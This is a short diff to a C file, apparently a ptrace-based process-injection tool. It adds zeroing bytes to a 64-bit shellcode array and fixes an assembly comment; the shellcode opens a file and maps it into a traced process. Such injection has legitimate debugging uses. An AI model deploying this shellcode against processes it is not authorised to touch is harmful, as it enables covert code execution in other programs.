@@ -57,6 +57,9 @@ long ptrace_mmapfd(pid_t pid,char *path)
   long *ptr,ret;
 
   char sc64[] =
+    /* zero the shit out */
+    "\x48\x31\xc0\x48\x31\xc9\x48\x31\xd2"
+    /* accutal hellcode */
     "\xeb\x36\x5f\x48\x31\xd2\x48\x31"
     "\xf6\xb0\x02\x0f\x05\xcc\x49\x89"
     "\xc0\x48\xbe\x41\x41\x41\x41\x41"
@@ -115,7 +118,7 @@ long ptrace_mmapfd(pid_t pid,char *path)
      mov dl,0x5            |  xor esi,esi
      mov cl,0x2            |  inc esi; inc esi;
      mov r10,rcx           |  mov dl, 0x5
-     mov alx,0x9           |  mov al, 0xc0
+     mov al,0x9            |  mov al, 0xc0
      syscall               |  int 80h | call gs:0x10
                   int3
      push rax              |  push eax
